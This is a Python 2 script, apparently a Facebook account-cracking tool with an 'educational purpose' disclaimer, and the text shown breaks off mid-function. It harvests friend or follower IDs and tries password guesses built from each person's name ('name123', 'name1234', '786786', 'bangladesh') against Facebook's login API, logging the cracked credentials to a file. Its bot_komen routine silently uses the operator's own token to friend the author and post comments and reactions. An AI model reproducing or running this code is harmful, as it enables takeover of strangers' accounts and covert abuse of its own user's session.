#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To QaiserAbbas
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020

import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 lovehacker.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;96m|', '\x1b[1;92m/', '\x1b[1;95m-', '\x1b[1;91m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)


t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Keluar'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0003)


logo = """

░██████╗██╗░░░██╗██████╗░░█████╗░██╗░██████╗
██╔════╝██║░░░██║██╔══██╗██╔══██╗██║██╔════╝
╚█████╗░██║░░░██║██║░░██║███████║██║╚█████╗░
░╚═══██╗██║░░░██║██║░░██║██╔══██║██║░╚═══██╗
██████╔╝╚██████╔╝██████╔╝██║░░██║██║██████╔╝
╚═════╝░░╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░

\033[1;94m-----------------------------------------------

\033[1;92mCoder   :\033[1;96mSUDAIS KHAN
\033[1;92mGithub  :\033[1;96mhttps://github.com/MrAtifjan
\033[1;92mFacebook:\033[1;96mMaroofKhanBro
\033[1;92mYoutube :\033[1;96mBrain Center
\033[1;92mNote :\033[1;96mFuXk The System
\033[1;92mNew Update :\033[1;96m Identity Problem Fixed 100% If You Login With Acces Token

\033[1;94m-----------------------------------------------""" 
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
os.system('clear')
print '\n\x1b[1;96m==='
os.system('clear')
jalan('  \033[1;94m    ::::::::        :::     ::::::::::: ::::::::  :::::::::: ::::::::: ')
jalan('  \033[1;94m :+:    :+:     :+: :+:       :+:    :+:    :+: :+:        :+:    :+: ')
jalan('  \033[1;94m +:+    +:+    +:+   +:+      +:+    +:+        +:+        +:+    +:+  ')
jalan('  \033[1;94m  +#+    +:+   +#++:++#++:     +#+    +#++:++#++ +#++:++#   +#++:++#:    ')
jalan('  \033[1;94m +#+    +#+   +#+     +#+     +#+           +#+ +#+        +#+    +#+    ')
jalan('  \033[1;94m #+#    #+#   #+#     #+#     #+#    #+#    #+# #+#        #+#    #+#     ')
jalan('  \033[1;94m########### ###     ### ########### ########  ########## ###    ###      ')
jalan('                                contact me in fb Qaiser Abbas 🔒     ')

def masuk():
    os.system('clear')
    print logo
    print '\033[1;95m 1 Login Token Facebook'
    print '\033[1;95m 2 Login With Facebook'
    print '\x1b[1;91m 0 Exit'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\033[1;96mSlect Options\033[1;93m:\x1b[1;97m ')
    if msuk == '':
        print '\033[1;91mFill Correctly !'
        pilih_masuk()
    elif msuk == '1' or msuk == '1':
        tokenz()
    elif msuk == '2' or msuk == '2':
        login()
    elif msuk == '0' or msuk == '0':
        keluar()
    else:
        print '\033[1;91mFill Correctly !'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo
    print 36 * '\x1b[1;94m\xe2\x96\x93'
    toket = raw_input('\033[1;31m Token \033[1;96m : \033[1;94m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\033[1;93m Sucessfully Logined '
        os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
        bot_komen()
    except KeyError:
        print '\033[1;91m Token wrong '
        time.sleep(1.7)
        masuk()


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
        jalan(' \033[1;91mWarning : \033[1;93mDo Not Use Your Personal Account')
        jalan(' \033[1;91mDisclaimer : \033[1;93mThis Tool Is Only For Educational Purpose')
        jalan(' \033[1;91mNote : \033[1;93m I am not Responsible For Any Miss Use ')
        print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
        print ' \033[1;95m Login Your Facebook Account'
        print '\t'
        id = raw_input('[+] \033[1;91mID/Email : \033[1;93m')
        pwd = raw_input('[+] \033[1;91mPassword : \033[1;93m')
        menu()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\033[1;91mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;94mLogin Successfull'
                os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                bot_komen()
            except requests.exceptions.ConnectionError:
                print '\033[1;91mThere is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91mYour Account is in Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\033[1;91mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100013185071041'
    kom = 'I Use BlackMafia \xf0\x9f\x98\x98'
    reac = 'ANGRY'
    post = '937777953338365'
    post2 = '938954086554085'
    kom2 = 'Great lovehacker \xf0\x9f\x98\x81'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;91m{!} Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\033[1;91m{!} No connection'
        keluar()

    os.system('clear')
    print logo
    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
    print '\033[1;33m NAME\x1b[1;95m    =>\x1b[1;92m ' + nama
    print '\033[1;33m USER ID\x1b[1;95m =>\x1b[1;92m ' + id
    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
    print '\033[1;96m{' + warni + '01\033[1;92m}' + warna + ' Crack ID Friend/Public'
    print '\033[1;96m{' + warni + '02\033[1;92m}' + warna + ' Crack ID From Group / Friend Posts'
    print '\033[1;96m{' + warni + '03\033[1;92m}' + warna + ' Crack ID From Followers'
    print '\033[1;96m{' + warni + '04\033[1;92m}' + warna + ' Crack ID Using a Username'
    print '\033[1;96m{\x1b[1;91m00\033[1;92m}' + warna + ' Back'
    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;92mSlect Options \x1b[91m:\x1b[1;96m ')
    if unikers == '':
        print '\x1b[1;91m{\x1b[1;91m!\x1b[1;91m}\x1b[1;91m  Fill Correctly!'
        pilih()
    elif unikers == '1' or unikers == '01':
        crack_teman()
    elif unikers == '2' or unikers == '02':
        crack_likes()
    elif unikers == '3' or unikers == '03':
        crack_follow()
    elif unikers == '4' or unikers == '04':
        user_id()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Remove token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91m{\x1b[1;91m!\x1b[1;91m}\x1b[1;91m Fill Correctly !'
        pilih()


def crack_teman():
    os.system('clear')
    print logo
    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
    print '\033[1;92m{' + warna + '01\x1b[1;97m}' + warni + ' Crack ID Bangladesh'
    print '\033[1;92m{' + warna + '02\x1b[1;97m}' + warni + ' Crack ID Pakistan'
    print '\033[1;91m00\033[1;92m}' + warni + ' Back'
    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
    pilih_teman()


def pilih_teman():
    univ = raw_input('' + warna + 'Slect Options\033[91m : \033[1;96m ')
    if univ == '':
        print '\033[1;91mFill Correctly !'
        pilih_teman()
    elif univ == '1' or univ == '02':
        crack_bangla()
    elif univ == '2' or univ == '04':
        crack_pakis()
    elif univ == '5' or univ == '05':
        univ()
    elif univ == '0' or univ == '00':
        menu()
    else:
        print '\033[1;91m Fill Correctly !'
        pilih_teman()



def crack_bangla():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 36 * '\x1b[1;94m\xe2\x96\x93'
    print '01\x1b[1;97m Crack From Friend list'
    print '2\x1b[1;97m Crack From Public Frendlist'
    print '03\x1b[1;97m Crack From File'
    print '00\x1b[1;97m  Back'
    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
    pilih_bangla()


def pilih_bangla():
    teak = raw_input('\033[1;96mSlect Options \033[1;92m ')
    if teak == '':
        print '033[1;91m Fill Correctly !'
        pilih_bangla()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
            print '             033[1;94m Crack Bangladesh '
            print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
            print '            033[1;95m  Crack Bangladesh '
            print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
            idb = raw_input('033[1;92mID Public/friend : ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idb + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '033[1;91m Name :' + sp['name']
            except KeyError:
                print '033[1;91m ID public / friend does not exist !'
                raw_input('033[1;91m<Back>')
                crack_bangla()
            except requests.exceptions.ConnectionError:
                print '033[1;91m{!} No internet Conection!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idb + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
                print '             033[1;94m Crack Bangladesh'
                print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
                idlist = raw_input('033[1;91mName File : ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '033[1;91mFile does not exist ! '
                raw_input('033[1;91mBack ')
            except IOError:
                print '033[1;91mFile does not exist ! '
                raw_input('033[1;91mBack')
                crack_bangla()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '033[1;91mFill Correctly !'
            pilih_bangla()
        print '033[1;95m Total Ids' + str(len(id))
        print '033[1;94m Stop Process Press CTRL then Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '033[1;96mCrack start ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '033[0;31m Use Vpn If Not Working'
    print '033[0;32m Commands By Qaiser Abbas'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name   \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/bangla.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos1
                cek = open('done/bangla.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/bangla.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos2
                    cek = open('done/bangla.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/bangla.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos3
                        cek = open('done/bangla.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '786786'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/bangla.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos4
                            cek = open('done/bangla.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'bangladesh'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/bangla.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos5
                                cek = open('done/bangla.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '786'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/bangla.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos6
                                    cek = open('done/bangla.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/bangla.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos7
                                        cek = open('done/bangla.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
